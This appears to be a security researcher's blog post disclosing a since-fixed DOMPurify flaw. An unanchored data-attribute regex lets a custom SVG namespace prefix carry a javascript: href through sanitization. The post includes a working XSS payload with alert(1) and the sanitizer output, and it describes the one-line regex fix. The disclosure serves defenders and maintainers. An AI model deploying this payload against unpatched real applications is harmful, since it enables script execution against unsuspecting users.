+++
title = 'DOM Purify - dirty namespace bypass'
date = 2024-12-09T00:00:00+03:00
draft = false
+++

> The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

# Introduction

In this article, I want to talk about a method for bypassing DOMPurify when it is used for sanitizing SVG files, which I recently discovered.

# Purify ~~html~~ svg
In most cases, developers use DOMPurify to sanitize HTML files, and it looks something like this:

```javascript
DOMPurify.sanitize("<a href='https://x.com/slonser_'>slonser</a>")
// output: <a href="https://x.com/slonser_">slonser</a>
```
At the same time, developers sometimes use DOMPurify to sanitize SVG files, and in such cases, they might modify the PARSER_MEDIA_TYPE
```javascript
DOMPurify.sanitize(`<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg"><text x="20" y="35">Click me!</text></svg>`, {PARSER_MEDIA_TYPE: 'application/xhtml+xml'})
// output: <svg height="600" width="800" xmlns="http://www.w3.org/2000/svg"><text y="35" x="20">Click me!</text></svg>
```
# Reading the code
Recently, I encountered this behavior again while analyzing an application and decided it would be fun to try to bypass it and achieve XSS.
I decided to review DOMPurify once more in search of any oddities and found a flaw that helped me:
```js
const DATA_ATTR = seal(/^data-[\-\w.\u00B7-\uFFFF]/);
```
It’s a regular expression that checks the validity of data attribute names (DOMPurify with flawed settings allows the insertion of attributes like `data-*`).
What shocked me was that the regular expression lacked an end-of-string anchor, meaning the attribute could look like this:
```js
/^data-[\-\w.\u00B7-\uFFFF]/.test('data-slonser<')
// output: true
```

# So... How to exploit this?
At first glance, this might seem useless. However, it allows you to insert a very important character, `:`, into a data attribute.
Since SVG files are essentially XML files with a defined namespace, it becomes possible to define custom namespaces and use their prefixes before an attribute.
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:slonser="http://link_to_namespace">
<a slonser:attrbute="value"></a>
</svg>
```
At this point, I think many have already guessed the issue. We can create our own namespace with a name like `data-slonser` and use it to insert arbitrary attributes:
```js
console.log(DOMPurify.sanitize(`<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg">
<a xmlns:data-slonser="http://www.w3.org/1999/xlink" data-slonser:href="javascript:alert(1)">
<text  x="20" y="35">Click me!</text>
</a>
</svg>`, {PARSER_MEDIA_TYPE: 'application/xhtml+xml'}));
```
Output:
```xml
<svg height="600" width="800" xmlns="http://www.w3.org/2000/svg">
<a xmlns:data-slonser="http://www.w3.org/1999/xlink" data-slonser:href="javascript:alert(1)">
<text y="35" x="20">Click me!</text>
</a>
</svg>
```
When such an SVG file is opened, and the user clicks on the text, our JavaScript will execute.


Many might also notice that the `<a>` tag contains an attribute `xmlns:data-slonser`, which is clearly unsupported and should have been sanitized. You may wonder why it is present in the output.
Indeed, it won’t be set by DOMPurify and won’t pass sanitization. So why does it appear in the output? The reason lies in this line:

```js
        if (namespaceURI) {
          currentNode.setAttributeNS(namespaceURI, name, value);
        } else {
```
When our attribute is associated with this namespace, `DOMParser` will automatically recognize and interpret it, ensuring that the tag is included in the attributes.

# Fix
I reported this issue to [cure53](https://x.com/cure53berlin), and he fixed it within an hour (As always, the fastest fixes in open source!).
The issue was resolved simply by adding two characters to the regex, which now looks like this:
```
/^data-[\-\w.\u00B7-\uFFFF]+$/
```

## P.S.
Thanks to the DOMPurify developers for the best experience, as always. I hope this will be useful to someone. Also, it's possible that this issue affects custom tags, but I haven't seen them used in the context of SVG, so I didn't check.
Thank you for reading!